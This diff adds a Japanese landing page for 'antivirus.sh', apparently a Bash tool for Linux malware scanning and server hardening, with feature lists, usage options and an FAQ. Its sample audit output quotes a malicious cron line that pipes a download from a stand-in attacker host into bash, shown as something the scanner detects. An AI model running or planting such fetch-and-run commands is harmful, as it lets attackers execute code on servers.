@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>antivirus.sh — Bashスクリプト1本で実現するLinuxアンチウイルスとセキュリティハードニング</title>
+<meta name="description" content="Linux向けの無料オープンソースセキュリティツール。マルウェア・ルートキットスキャン、ネットワーク監査、70以上のシステムチェック、そしてUbuntuをはじめあらゆるLinuxサーバーをコマンド1つでハードニング。純粋なBash、依存関係ゼロ。">
+<link rel="canonical" href="https://antivirus.sh/ja/">
+<link rel="alternate" hreflang="en" href="https://antivirus.sh/">
+<link rel="alternate" hreflang="ru" href="https://antivirus.sh/ru/">
+<link rel="alternate" hreflang="zh" href="https://antivirus.sh/zh/">
+<link rel="alternate" hreflang="ko" href="https://antivirus.sh/ko/">
+<link rel="alternate" hreflang="ja" href="https://antivirus.sh/ja/">
+<link rel="alternate" hreflang="it" href="https://antivirus.sh/it/">
+<link rel="alternate" hreflang="es" href="https://antivirus.sh/es/">
+<link rel="alternate" hreflang="de" href="https://antivirus.sh/de/">
+<link rel="alternate" hreflang="ar" href="https://antivirus.sh/ar/">
+<link rel="alternate" hreflang="fr" href="https://antivirus.sh/fr/">
+<link rel="alternate" hreflang="x-default" href="https://antivirus.sh/">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://antivirus.sh/ja/">
+<meta property="og:title" content="antivirus.sh — Bashスクリプト1本でLinuxのアンチウイルスとハードニングを">
+<meta property="og:description" content="あらゆるLinuxサーバーのためのマルウェアスキャン、ネットワーク監査、70以上のセキュリティチェック。無料・オープンソース。">
+<meta property="og:locale" content="ja_JP">
+<meta name="theme-color" content="#0a0e13">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🛡️</text></svg>">
+<link rel="stylesheet" href="/assets/style.css">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "SoftwareApplication",
+  "name": "antivirus.sh",
+  "operatingSystem": "Linux",
+  "applicationCategory": "SecurityApplication",
+  "offers": { "@type": "Offer", "price": "0", "priceCurrency": "USD" },
+  "url": "https://antivirus.sh/ja/",
+  "downloadUrl": "https://github.com/TARGET_PLEVEHOLDER/antivirus.sh",
+  "license": "https://opensource.org/licenses/MIT",
+  "inLanguage": "ja",
+  "description": "オープンソースのLinuxセキュリティツール。マルウェアとルートキットのスキャン、ネットワーク監査、70以上のシステムチェック、そして自動ハードニングを単一のBashスクリプトで実現します。"
+}
+</script>
+</head>
+<body>
+
+<div class="langs"><div class="wrap">
+<a href="/">English</a><a href="/ru/">Русский</a><a href="/zh/">中文</a><a href="/ko/">한국어</a><a href="/ja/" class="active">日本語</a><a href="/it/">Italiano</a><a href="/es/">Español</a><a href="/de/">Deutsch</a><a href="/ar/">العربية</a><a href="/fr/">Français</a>
+</div></div>
+
+<nav><div class="wrap">
+<span class="brand">🛡️ antivirus<span class="dot">.sh</span></span>
+<div class="links">
+<a href="#features">機能</a>
+<a href="#checks">チェック項目</a>
+<a href="#install">インストール</a>
+<a href="#usage">使い方</a>
+<a href="#safety">安全性</a>
+<a href="#faq">FAQ</a>
+<a class="gh-btn" href="https://github.com/TARGET_PLEVEHOLDER/antivirus.sh">★ GitHub</a>
+</div>
+</div></nav>
+
+<header class="hero"><div class="wrap">
+<h1>antivirus<span class="dot">.sh</span></h1>
+<p class="tag">Linuxのためのマルウェアスキャン、ネットワーク監査、システム全体のハードニングを<b>Bashスクリプト1本</b>で。</p>
+<p class="sub">依存関係ゼロ。すべてのUbuntuバージョンと、事実上あらゆるLinuxディストリビューションで動作します。デフォルトは監査のみ、必要なときだけ対話的に修正、そしていつでも完全ロールバック。</p>
+<div class="cta">
+<a class="btn btn-green" href="#install">はじめる →</a>
+<a class="btn btn-ghost" href="https://github.com/TARGET_PLEVEHOLDER/antivirus.sh">GitHubでソースを見る</a>
+</div>
+<div class="badges">
+<span><b>70以上</b>のセキュリティチェック</span>
+<span><b>100%</b> Bash</span>
+<span><b>MIT</b>ライセンス</span>
+<span>依存関係<b>0</b></span>
+<span>root <b>&amp;</b> 非rootに対応</span>
+</div>
+
+<div class="term">
+<div class="term-bar"><i></i><i></i><i></i></div>
+<pre>
+<span class="t-dim">$</span> <span class="t-w">sudo bash antivirus.sh --audit</span>
+
+<span class="t-info">==&gt;</span> <span class="t-w">Firewall</span>
+  <span class="t-crit">[CRIT]</span> NO active firewall detected — every listening service is fully exposed
+<span class="t-info">==&gt;</span> <span class="t-w">SSH server</span>
+  <span class="t-warn">[WARN]</span> SSH password authentication enabled — brute-force surface
+  <span class="t-ok">[ OK ]</span> SSH root login disabled
+<span class="t-info">==&gt;</span> <span class="t-w">Processes &amp; memory</span>
+  <span class="t-ok">[ OK ]</span> no known malware/miner process signatures
+  <span class="t-ok">[ OK ]</span> no hidden processes (readdir-hiding rootkit test passed)
+<span class="t-info">==&gt;</span> <span class="t-w">Persistence &amp; startup points</span>
+  <span class="t-crit">[CRIT]</span> suspicious content in cron file /etc/cron.d/update:
+         <span class="t-dim">1: * * * * * root curl -s http://evil.tld/x | bash</span>
+
+  security score: <span class="t-w">61/100</span>  grade: <span class="t-crit">F — critical issues found</span>
+  next step: <span class="t-w">sudo bash antivirus.sh --fix</span>
+</pre>
+</div>
+</div></header>
+
+<section id="features"><div class="wrap">
+<h2>antivirus.sh を選ぶ理由</h2>
+<p class="lead">世の中のLinuxマシンの大半はサーバーであり、侵害の入口はいつも同じ、ありふれた扉です。公開されたポート、パスワード認証のSSH、忘れ去られたcronジョブ、パッチ未適用のパッケージ。antivirus.sh はそれらの扉を数分で閉じ、すでに入り込んだ侵入者がいないかも探し出します。</p>
+<div class="grid">
+<div class="card"><div class="ic">📦</div><h3>単一ファイル、依存関係ゼロ</h3><p>Bashスクリプト1本だけ。Pythonもエージェントもデーモンもなく、コンパイルも不要です。ダウンロードして実行し、不要になれば消すだけ — 後に残るのはレポートと（お望みなら）ハードニング済みのシステムです。</p></div>
+<div class="card"><div class="ic">🐧</div><h3>どのUbuntuでも。どのLinuxでも。</h3><p>すべてのUbuntuリリースで動作を保証 — 古いLTSから最新版まで。Debian、RHEL、CentOS、Alma、Rocky、Fedora、Arch、openSUSE、Alpineはベストエフォートでサポートし、すべてのチェックは利用できない環境でも安全に縮退します。</p></div>
+<div class="card"><div class="ic">🔍</div><h3>実世界のマルウェアを発見</h3><p>クリプトマイナー、リバースシェル、cronドロッパー、SSH鍵バックドア、LD_PRELOADルートキット、ファイルレスなmemfdペイロード、隠しプロセス — 侵害されたサーバーで実際に見つかるものを狙います。</p></div>
+<div class="card"><div class="ic">🧯</div><h3>見つけるだけでなく、直す</h3><p>検出された問題には必ず適用可能な修正が付いてきます。対話的に、<code>--fix</code> で自動的に、あるいは <code>--harden</code> で新規VMのフルセットアップとして。<code>--audit</code> なら100%読み取り専用のままです。</p></div>
+<div class="card"><div class="ic">🪢</div><h3>締め出されない設計</h3><p>ファイアウォール有効化の前にSSHポートを事前許可。鍵が実在しない限り鍵認証のみへの切り替えは拒否。新しいsshd設定はリロード前に検証。すべてバックアップされ、<code>--rollback</code> で元に戻せます。</p></div>
+<div class="card"><div class="ic">🤝</div><h3>本格派ツールとの連携も万全</h3><p>ClamAV、rkhunter、chkrootkitが存在すれば検出して連携し、フラグ1つでインストールも可能。antivirus.sh を高速な第一防衛線として、そしてディープスキャナーをまとめる接着剤として活用できます。</p></div>
+</div>
+</div></section>
+
+<section id="checks"><div class="wrap">
+<h2>チェック項目の完全カタログ</h2>
+<p class="lead">6つの領域にわたる70以上の個別チェック。すべての検出結果はOK / INFO / WARN / CRITに分類され、最終的な0〜100のセキュリティスコアに反映されます。</p>
+<div class="cat">
+<div class="card"><h3><b>01</b> マルウェアとルートキット</h3><ul>
+<li>既知のマイナー・マルウェアのプロセス名（xmrig、kinsing、kdevtmpfsi…）とマイニングプールのコマンドライン</li>
+<li><code>/tmp</code>、<code>/var/tmp</code>、<code>/dev/shm</code> から実行されているプロセス</li>
+<li>バイナリが削除済みのプロセス、ファイルレスな <code>memfd</code> 実行ファイル</li>
+<li>隠しプロセスの検出（readdir隠蔽型カーネルルートキットのテスト）</li>
+<li>既知のルートキット（Diamorphine、Reptile…）に一致するカーネルモジュール</li>
+<li><code>/etc/ld.so.preload</code> とグローバルな <code>LD_PRELOAD</code> によるユーザーランド・ルートキット</li>
+<li>tmpディレクトリと <code>/dev</code> 内の隠し実行ファイル</li>
+<li>2&nbsp;MBまでのスクリプト内のリバースシェル／ドロッパー／マイナーのパターン</li>
+<li>パッケージのチェックサムによるコアバイナリの整合性検証（<code>dpkg -V</code> / <code>rpm -V</code>）</li>
+<li>ClamAV、rkhunter、chkrootkitとの連携（オプション）</li>
+</ul></div>
+<div class="card"><h3><b>02</b> 永続化とバックドア</h3><ul>
+<li>システムとユーザーのcrontab、<code>cron.d</code>、hourly/daily/weekly/monthly、<code>at</code> ジョブ</li>
+<li>tmpから実行される、または攻撃パターンに一致するカスタムsystemdユニット</li>
+<li><code>rc.local</code>、initスクリプト、udevルール、MOTDスクリプト</li>
+<li>全ユーザーのシェル起動ファイル（<code>.bashrc</code>、<code>.profile</code>、<code>.zshrc</code>…）</li>
+<li>全アカウントの <code>authorized_keys</code> 監査 — システムアカウントに設定されたSSH鍵を警告</li>
+<li>余分なUID 0アカウント、NOPASSWDなsudoルール、レガシーな <code>.rhosts</code> 信頼ファイル</li>
+<li>サードパーティAPTリポジトリのレビュー</li>
+</ul></div>
+<div class="card"><h3><b>03</b> ネットワークの露出</h3><ul>
+<li>リッスン中の全TCP/UDPポートを所有プロセスとバインドアドレス付きで一覧</li>
+<li>公開状況の分類: ループバックのみか、外部から到達可能か</li>
+<li>危険なサービスを警告: Telnet、FTP、r-services、SMB、RDP、VNC、rsync、NFS、rpcbind</li>
+<li>デフォルトで認証なしのデータストア: Redis、MongoDB、Elasticsearch、memcached</li>
+<li>:2375 で公開されたDocker API（即座にリモートrootを奪われる）の検出</li>
+<li>マイニングプール／IRCボットネットのポートへの確立済み接続</li>
+<li>プロミスキャスモードのインターフェース、ARPスプーフィングの兆候</li>
+<li>DNSリゾルバのレビューと <code>/etc/hosts</code> 改ざんの検出</li>
+</ul></div>
+<div class="card"><h3><b>04</b> SSHとアカウント</h3><ul>
+<li>rootログイン、パスワード認証、空パスワード、X11フォワーディング</li>
+<li>MaxAuthTries、ログイン猶予時間、キープアライブ、ホストベース認証、rhosts</li>
+<li>fail2banの有無の確認とsshd jailの自動セットアップ</li>
+<li><code>btmp</code> のログイン失敗記録によるブルートフォース攻撃の痕跡</li>
+<li>空パスワードのアカウント（キー1つでロック可能）、UIDの重複</li>
+<li>ログインシェルを持つシステムアカウント、sudoグループのメンバーシップのレビュー</li>
+<li>パスワードエージングポリシーとpam_pwqualityによる強度の強制</li>
+</ul></div>
+<div class="card"><h3><b>05</b> カーネルとファイルシステム</h3><ul>
+<li>16のsysctlハードニングキー: ASLR、syncookies、リダイレクト、ソースルーティング、rp_filter、ptraceスコープ、dmesg/kptrの制限、protected links…</li>
+<li><code>shadow</code>、<code>sudoers</code>、SSHホスト鍵、crontab、GRUB設定のパーミッション</li>
+<li>厳選されたホワイトリストとパッケージ所有権の証明に基づくSUID/SGID監査</li>
+<li>誰でも書き込み可能なファイルと、stickyビットのない誰でも書き込み可能なディレクトリ</li>
+<li>所有者不明のファイル、immutableフラグ（<code>chattr +i</code>）によるマルウェアのロック</li>
+<li><code>/dev/shm</code> と <code>/tmp</code> のマウントフラグ（noexec、nosuid、nodev）</li>
+<li>コアダンプの制限とSUIDダンプの防止</li>
+</ul></div>
+<div class="card"><h3><b>06</b> プラットフォームとサービス</h3><ul>
+<li>未適用のセキュリティアップデート、unattended-upgrades、EOLリリースの検出</li>
+<li>カーネルパッチ適用後の再起動要否の検出</li>
+<li>AppArmor / SELinuxの強制アクセス制御の状態</li>
+<li>auditdによるフォレンジック証跡、journaldの永続ロギング</li>
+<li>NTP時刻同期（TLSとフォレンジックの前提条件です）</li>
+<li>CPU脆弱性の緩和策（Meltdown/Spectre系）</li>
+<li>Docker: ソケットのパーミッション、特権コンテナ、dockerグループのメンバー</li>
+<li>Secure Bootの状態、GRUBパスワードの推奨</li>
+</ul></div>
+</div>
+</div></section>
+
+<section id="install"><div class="wrap">
+<h2>インストールと初回実行</h2>
+<p class="lead">古典的な意味での「インストール」は不要です — ただのスクリプトですから。コマンド3つで完全なレポートが手に入ります。</p>
+<div class="codes">
+<div class="code"><div class="lbl">ダウンロード</div><button class="copy" data-c="curl -fsSL https://raw.githubusercontent.com/TARGET_PLEVEHOLDER/antivirus.sh/main/antivirus.sh -o antivirus.sh">copy</button>
+<pre>curl -fsSL https://raw.githubusercontent.com/TARGET_PLEVEHOLDER/antivirus.sh/main/antivirus.sh -o antivirus.sh</pre></div>
+<div class="code"><div class="lbl">1 — 安全な読み取り専用監査（何も変更しません）</div><button class="copy" data-c="sudo bash antivirus.sh --audit">copy</button>
+<pre>sudo bash antivirus.sh <span class="g">--audit</span></pre></div>
+<div class="code"><div class="lbl">2 — 対話モード: 各修正を確認しながら適用</div><button class="copy" data-c="sudo bash antivirus.sh">copy</button>
+<pre>sudo bash antivirus.sh</pre></div>
+<div class="code"><div class="lbl">3 — または新規VMを一括ハードニング</div><button class="copy" data-c="sudo bash antivirus.sh --harden">copy</button>
+<pre>sudo bash antivirus.sh <span class="g">--harden</span></pre></div>
+</div>
+<p style="margin-top:18px;color:var(--muted);font-size:15px">ヒント: rootなしでも動作します — 実行可能なチェックをすべて行い、残りはその旨を明確に表示します。<span class="t-dim">git cloneでもOK: <code>git clone https://github.com/TARGET_PLEVEHOLDER/antivirus.sh</code></span></p>
+</div></section>
+
+<section id="usage"><div class="wrap">
+<h2>モードとオプション</h2>
+<p class="lead">スクリプトは1本、使い方は4通り: 監査、対話、自動、フルハードニング。さらにスクリプティングやcron向けの限定スコープも用意しています。</p>
+<table>
+<tr><th>コマンド</th><th>動作</th></tr>
+<tr><td><code>sudo bash antivirus.sh</code></td><td>対話モード — すべての検出結果を表示し、修正を1つずつ確認します。初回実行におすすめです。</td></tr>
+<tr><td><code>--audit</code></td><td>レポートのみ。変更ゼロを保証 — 本番環境でも安全です。終了コード0/1/2 = 問題なし/警告/重大。cronやCIに最適です。</td></tr>
+<tr><td><code>--fix</code></td><td><i>安全な</i>修正をすべて自動適用します。リスクの高い修正（ファイアウォール、SSH認証）には引き続き明示的な確認が必要です。</td></tr>
+<tr><td><code>--harden</code></td><td><code>--fix</code> の全内容に加え、新規VM向けフルキット: ファイアウォール、fail2ban、unattended-upgrades、sysctl一式、auditd、パスワードポリシー、バナー、コアダンプとshmのロックダウン。さらに、きちんとした管理者ユーザーの作成も提案します。</td></tr>
+<tr><td><code>--create-user</code></td><td>sudoユーザーのガイド付き作成: 強力なパスワードの自動生成、SSH鍵のインストール、必要に応じて鍵認証のみのSSHへの切り替え — セッションを閉じる前にテストするようリマインドします。</td></tr>
+<tr><td><code>--scan /var/www</code></td><td>指定ディレクトリのマルウェアスキャン（Webのドキュメントルートは格好の隠し場所です）。</td></tr>
+<tr><td><code>--network</code> / <code>--system</code> / <code>--malware</code></td><td>単一の領域のみを実行します。</td></tr>
+<tr><td><code>--quick</code></td><td>時間のかかる処理（ディスク全体のスキャン、ClamAV）をスキップ — 数秒で完了します。</td></tr>
+<tr><td><code>--full</code></td><td>最も深いモード: ファイルシステム全体をスキャンし、インストール済みの全パッケージを検証します。</td></tr>
+<tr><td><code>--rollback</code></td><td>前回の実行で変更されたすべてのファイルを復元し、ファイアウォールの有効化も取り消します。</td></tr>
+<tr><td><code>--install-tools</code></td><td>シグネチャベースの深掘りのため、ClamAV、rkhunter、chkrootkitをインストールします。</td></tr>
+<tr><td><code>--report file.txt</code> · <code>--no-color</code> · <code>--yes</code> · <code>--exclude PATH</code></td><td>レポート出力と自動化のためのヘルパーです。</td></tr>
+</table>
+<div class="codes" style="margin-top:26px">
+<div class="code"><div class="lbl">レポート保存付きの週次cron監査</div><button class="copy" data-c="0 6 * * 1 root bash /opt/antivirus.sh --audit --no-color --report /var/log/antivirus-weekly.txt">copy</button>
+<pre>0 6 * * 1 root bash /opt/antivirus.sh --audit --no-color --report /var/log/antivirus-weekly.txt</pre></div>
+</div>
+</div></section>
+
+<section id="safety"><div class="wrap">
+<h2>自分を締め出せないように作られています</h2>
+<p class="lead">ハードニングツールには、自分が座っている枝を切り落とす悪い癖があります。antivirus.sh はリモートアクセスを何よりも神聖なものとして扱います。</p>
+<ul class="safe">
+<li><b>ファイアウォール有効化はSSHを事前許可。</b> SSHポートを3つの方法（sshd設定、稼働中のソケット、現在の接続）で検出し、<code>ufw enable</code> の実行<i>前</i>に許可します。</li>
+<li><b>鍵がなければ鍵認証のみへの切り替えを拒否。</b> <code>PasswordAuthentication no</code> は、sudo権限を持つユーザーが実際に <code>authorized_keys</code> エントリを持っている場合にのみ適用されます。rootログインの無効化も同様です。</li>
+<li><b>sshd設定はリロード前に検証。</b> すべての変更は <code>sshd -t</code> を通過します。検証に失敗した設定は自動的に復元され、稼働中のSSHセッションが切断されることはありません。</li>
+<li><b>すべてをバックアップ。</b> 変更された各ファイルは、マニフェスト付きのタイムスタンプ付きバックアップディレクトリにコピーされます。<code>--rollback</code> はそのすべてを復元し、スクリプトが有効化したファイアウォールの無効化まで行います。</li>
+<li><b>削除せず、隔離。</b> 不審なファイルは隔離ディレクトリへ移動され、すべてのパーミッションを剥奪されます — 証拠と可逆性はそのまま保たれます。</li>
+<li><b>リスクの高い修正は必ず確認。</b> <code>--fix</code> モードであっても、リモートアクセスに影響しうる操作には明示的な確認（または文書化された、意図的な <code>--yes</code>）が必要です。</li>
+</ul>
+</div></section>
+
+<section id="newvm"><div class="wrap">
+<h2>レシピ: 新規VMを3分でハードニング</h2>
+<p class="lead">クラウドプロバイダーから新しいUbuntu VMを受け取り、rootパスワードが手元にある。やることは、これで全部です。</p>
+<div class="codes">
+<div class="code"><div class="lbl">ステップ 1 — 取得してハードニング</div><button class="copy" data-c="curl -fsSL https://raw.githubusercontent.com/TARGET_PLEVEHOLDER/antivirus.sh/main/antivirus.sh -o antivirus.sh &amp;&amp; sudo bash antivirus.sh --harden">copy</button>
+<pre>curl -fsSL https://raw.githubusercontent.com/TARGET_PLEVEHOLDER/antivirus.sh/main/antivirus.sh -o antivirus.sh
+sudo bash antivirus.sh <span class="g">--harden</span></pre></div>
+</div>
+<p style="color:var(--muted);margin-top:18px">実行中に行われること: SSHを事前許可したうえでファイアウォールを有効化 → fail2banとunattended-upgradesをインストール → 16のカーネルハードニングキーを適用 → SSHを強化（検証済み・セッション安全）→ パスワードポリシーを設定 → <code>/dev/shm</code>、コアダンプ、放置されたシェルをロックダウン → SSH鍵付きの個人用sudoユーザーの作成を提案 → そして鍵が配置された後にはじめて、SSHの鍵認証のみへの切り替えとrootログインの無効化を提案します。新しいログインは別のターミナルでテストしてください — 現在のセッションは最後まで生き続けます。</p>
+</div></section>
+
+<section id="faq"><div class="wrap">
+<h2>FAQ</h2>
+<details><summary>ClamAVのような「本物の」アンチウイルスですか？</summary><p>担う層が違います。ClamAVは何百万ものファイルシグネチャと照合します。antivirus.sh は、実際にLinuxサーバーを侵害するパターン — マイナー、リバースシェル、cronドロッパー、SSHバックドア、ルートキットの痕跡 — を狩り出し、それらの侵入を許した設定を監査します。両者は互いを補完する関係であり、だからこそ antivirus.sh はClamAVを検出し、存在すれば活用し、<code>--install-tools</code> であなたの代わりにインストールまでします。</p></details>
+<details><summary>古いUbuntu 14.04でも、出たばかりの最新リリースでも動きますか？</summary><p>はい — それこそが設計上の制約です。純粋なBashでコンパイル済みの部品はなく、すべてのチェックにフォールバック（ss/netstat、systemd/sysvinit、ufw/iptables）があり、機能が存在しない場合はその旨を記して安全にスキップします。同じスクリプトがUbuntu 12.04世代のシステムから最新リリースまで動作します。</p></details>
+<details><summary>本番環境で実行しても安全ですか？</summary><p><code>--audit</code> モードは厳密に読み取り専用で、どんな環境でも最初の実行として推奨されます。変更を伴うモードは、各ステップを確認する（対話モード）か安全な修正に限定し（<code>--fix</code>）、触れたすべてのファイルのバックアップを保持し、<code>--rollback</code> を提供します。</p></details>
+<details><summary>本当にSSHから締め出されないのですか？</summary><p>危険な移行 — ファイアウォールの有効化、パスワード認証の無効化、rootログインの無効化 — はすべてガードされています。SSHポートは事前に許可され、鍵認証のみへの切り替え前に鍵の存在が検証され、設定は <code>sshd -t</code> で検証されて失敗時には自動で元に戻り、現在のセッションが切断されることはありません。それでも新しいログインを別のターミナルでテストすることをおすすめします。スクリプトは、まさにそのタイミングでリマインドしてくれます。</p></details>
+<details><summary>CRITICALな検出がありました。どうすればいいですか？</summary><p>まず検出内容を読んでください — 各項目は自らを説明し、証拠を出力します。マルウェアの検出であれば、提示された修正で隔離し、次にどうやって入り込んだのか（公開サービス? 盗まれた鍵? 古いCMS?）を考えます。重要: カーネルルートキットの兆候（隠しプロセス、ルートキットモジュール）がある場合、稼働中のシステム上でのクリーンアップは一切信頼できません — クリーンなイメージから再構築し、データのみを復元してください。</p></details>
+<details><summary>外部に通信したり、何かをアップロードしますか？</summary><p>いいえ。テレメトリも、アップロードも、あなたが明示的に要求したもの（パッケージのインストール、ClamAVのシグネチャ更新）以外の外部通信もありません。レポートはあなたのディスクに留まります。挙動はすべて監査可能です — 読みやすいBashファイル1本ですから。</p></details>
+<details><summary>Lynisとの違いは何ですか？</summary><p>Lynisは優れた純粋な監査ツールで、何が問題かを教えてくれます。antivirus.sh は明確な方針を持つ実践型です。アクティブなマルウェアも狩り、見つけた問題をロールバック付きで安全に修正します。両方を実行しても構いません。両者の見解が食い違うことは、ほとんどありません。</p></details>
+<details><summary>定期的に実行するには？</summary><p><code>--audit --no-color --report</code> を付けたcron行を追加してください（「使い方」参照）。終了コード0/1/2のおかげで、CI、cronメール、任意の監視システムからのアラートが簡単に実現できます。</p></details>
+</div></section>
+
+<footer><div class="wrap">
+<p><span class="brand">🛡️ antivirus<span class="dot">.sh</span></span></p>
+<p style="margin-top:8px">MITライセンスのもとで無料・オープンソース。</p>
+<p style="margin-top:6px"><a href="https://github.com/TARGET_PLEVEHOLDER/antivirus.sh">github.com/TARGET_PLEVEHOLDER/antivirus.sh</a> — issueやプルリクエストを歓迎します</p>
+<div class="f-langs">
+<a href="/">English</a><a href="/ru/">Русский</a><a href="/zh/">中文</a><a href="/ko/">한국어</a><a href="/ja/" class="active">日本語</a><a href="/it/">Italiano</a><a href="/es/">Español</a><a href="/de/">Deutsch</a><a href="/ar/">العربية</a><a href="/fr/">Français</a>
+</div>
+<p class="heart">あなたのサーバーを救えたなら、⭐ スターをお願いします</p>
+</div></footer>
+
+<script>
+document.querySelectorAll('.copy').forEach(function(b){
+  b.addEventListener('click', function(){
+    navigator.clipboard.writeText(b.dataset.c).then(function(){
+      b.textContent = 'copied!';
+      setTimeout(function(){ b.textContent = 'copy'; }, 1600);
+    });
+  });
+});
+</script>
+</body>
+</html>
